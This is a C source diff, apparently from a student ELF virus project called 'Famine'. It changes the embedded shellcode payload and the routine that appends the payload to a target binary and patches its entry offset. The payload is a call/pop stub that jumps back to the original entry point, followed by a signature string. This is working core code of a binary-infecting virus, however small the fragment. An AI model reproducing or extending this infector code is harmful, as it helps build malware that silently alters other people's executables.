@@ -1,10 +1,13 @@
 #include "famine.h"
 
+#include <stdint.h>
+#include <limits.h>
+
 static const unsigned char g_payload[PAYLOAD_BIN_SIZE] = {
-	0xe8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0xbb,
-	0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde,
-	0x48, 0x01, 0xd8, 0xff, 0xe0, 0x46, 0x41, 0x4d,
-	0x50, 0x4b, 0x4e, 0x54, 0x31
+	0xe8, 0x00, 0x00, 0x00, 0x00,
+	0x58, 0x48, 0x05,
+	0xef, 0xbe, 0xad, 0xde, 0xff, 0xe0,
+	0x6d, 0x62, 0x61, 0x74, 0x74, 0x79, 0x7c, 0x70, 0x62, 0x6f, 0x75, 0x63, 0x68, 0x65, 0x72
 };
 
 Elf64_Phdr *last_phdr(char *data)
@@ -129,9 +132,9 @@ int file_unload(t_file file)
 
 int sign(t_file target)
 {
-    uint64_t    entry;
+    int64_t     entry;
     size_t      target_size;
-    uint64_t    *patch;
+    int32_t     *patch;
 
     if (target.head == MAP_FAILED || target.size < PAYLOAD_BIN_SIZE)
     {
@@ -143,12 +146,17 @@ int sign(t_file target)
         file_unload(target);
         return 1;
     }
-    target_size = target.size - PAYLOAD_BIN_SIZE;
-    entry = payload(target.head, target_size, (char *)g_payload, PAYLOAD_BIN_SIZE);
-    patch = memmem(target.head + target_size, PAYLOAD_BIN_SIZE,
-            "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE", 8);
+	target_size = target.size - PAYLOAD_BIN_SIZE;
+	entry = payload(target.head, target_size, (char *)g_payload, PAYLOAD_BIN_SIZE);
+	if (entry < INT32_MIN || entry > INT32_MAX)
+	{
+		file_unload(target);
+		return (1);
+	}
+	patch = memmem(target.head + target_size, PAYLOAD_BIN_SIZE,
+			"\xEF\xBE\xAD\xDE", 4);
     if (patch)
-        *patch = entry;
+        *patch = (int32_t)entry;
     file_unload(target);
     if (patch == NULL)
         return 1;
